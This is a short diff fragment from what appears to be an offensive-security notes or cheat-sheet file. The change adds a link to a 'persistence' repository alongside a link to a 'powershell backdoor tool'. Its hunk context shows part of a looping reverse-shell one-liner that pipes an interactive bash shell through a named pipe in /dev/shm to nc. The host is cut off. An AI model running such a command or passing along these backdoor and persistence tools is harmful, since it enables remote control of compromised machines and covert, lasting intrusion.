@@ -56,3 +56,4 @@ while true; do sleep 5 && mknod /dev/shm/p p; cat /dev/shm/p | /bin/bash -i | nc
 
 # links
 - [powershell backdoor tool](https://github.com/ELMERIKH/Keres)
+- [persistence](https://github.com/MatheuZSecurity/D3m0n1z3dShell)
